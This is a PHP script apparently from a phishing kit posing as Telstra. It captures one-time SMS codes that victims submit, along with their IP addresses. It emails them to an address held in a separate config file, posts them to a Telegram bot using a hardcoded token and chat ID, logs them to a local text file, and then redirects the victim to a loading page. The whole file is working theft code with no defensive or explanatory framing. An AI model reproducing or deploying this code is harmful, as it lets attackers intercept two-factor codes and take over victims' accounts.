<?php
include('Email.php');
$ip = getenv("REMOTE_ADDR");
$message .= "---------------------------------------------------\n";
$message .= "SMS 1   : ".$_POST['otp']."\n";
$message .= "-------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------------------------------------------\n";




$subject = "SMS 1 | $ip ]";
$headers = "From: Telstra";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

$email = "".$EX445093_REMOT."";
mail($email,$subject,$message,$send,$headers);
$token = "6905974994:AAHLLwteCXblWnVf_HZ-mtEcyjI8VUSehGs";
$data = [
    'text' => $message,
    'chat_id' => '-4056576594'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
$file = fopen('../Flow.txt', 'a');
fwrite($file,$message);
header("Location: load2.php");

?>
